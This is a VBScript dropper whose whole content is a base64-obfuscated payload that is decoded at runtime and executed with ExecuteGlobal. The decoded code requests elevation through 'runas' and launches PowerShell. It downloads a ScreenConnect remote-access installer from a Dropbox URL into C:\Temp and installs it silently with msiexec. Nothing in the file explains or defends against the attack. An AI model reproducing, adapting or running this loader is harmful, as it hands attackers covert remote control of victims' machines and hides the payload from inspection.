' ==============================================
' good did
' 2025 vot
' ==============================================
Option Explicit

' 
Dim encodedScript
encodedScript = "U2V0IFVBQyA9IENyZWF0ZU9iamVjdCgiU2hlbGwuQXBwbGljYXRpb24iKQ0KVUFDLlNoZWxsRXhlY3V0ZSAicG93ZXJzaGVsbCIsICItQ29tbWFuZCAiIiYge21rZGlyIEM6XFRlbXAgLUZvcmNlIDI+JG51bGw7IGN1cmwuZXhlIC1MIC0tc3NsLW5vLXJldm9rZSAnaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzdoY2xyaWRuYjZkOGU0dWJ0bmk3Zy9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLTIubXNpP3Jsa2V5PXd1cXNoNnF5cTVnaTFrMjhlcjF3NWQxN2Mmc3Q9enpkaWJ1cDQmZGw9MScgLW8gQzpcVGVtcFwwdjZ5NC5tc2k7IG1zaWV4ZWMuZXhlIC9pICdDOlxUZW1wXDB2Nnk0Lm1zaScgL3FuIC9ub3Jlc3RhcnR9IiIiLCAiIiwgInJ1bmFzIiwgMQ=="

' Decode and execute the script
ExecuteGlobal Base64Decode(encodedScript)

Function Base64Decode(base64)
    Dim xml, elem
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set elem = xml.createElement("tmp")
    elem.DataType = "bin.base64"
    elem.Text = base64
    Base64Decode = BytesToString(elem.NodeTypedValue)
End Function

Function BytesToString(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2 ' Text
    stream.Charset = "us-ascii"
    BytesToString = stream.ReadText
    stream.Close
End Function